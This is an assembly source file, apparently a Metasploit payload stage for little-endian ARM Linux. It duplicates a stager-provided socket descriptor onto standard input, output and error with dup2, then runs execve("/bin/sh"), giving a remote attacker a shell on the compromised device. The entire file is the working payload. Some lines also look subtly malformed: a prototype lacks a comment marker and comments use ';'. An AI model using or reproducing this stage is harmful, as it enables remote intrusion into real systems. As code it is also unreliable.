@@
@
@        Name: generic
@   Qualities: -
@     Authors: nemo <nemo [at] felinemenace.org>
@     License: MSF_LICENSE
@ Description:
@
@        dup2 / execve("/bin/sh") stage for Linux ARM LE architecture.
@@

.text
.globl _start
_start:
int dup2(int oldfd, int newfd);
	mov r7,#63       ; __NR_dup2
	mov r1,#3
up:
	mov r0,r12       ; oldfd (descriptor stored in r12 by the stager)
	sub r1,#1        ; newfd
	swi 0
	cmp r1,#1
	bge up
@ execve(const char *path, char *const argv[], char *const envp[]);
	mov r7,#11       ; __NR_execve
	add r0,pc,#24    ; *path
	sub sp,#24
	str r0,[sp,#-20]
	mov r2,#0
	str r2,[sp,#-16] 	
	add r1,sp,#-20   ; *argv[]
	mov r2,r1        ; *envp[]
	swi 0
.string "/bin/sh"
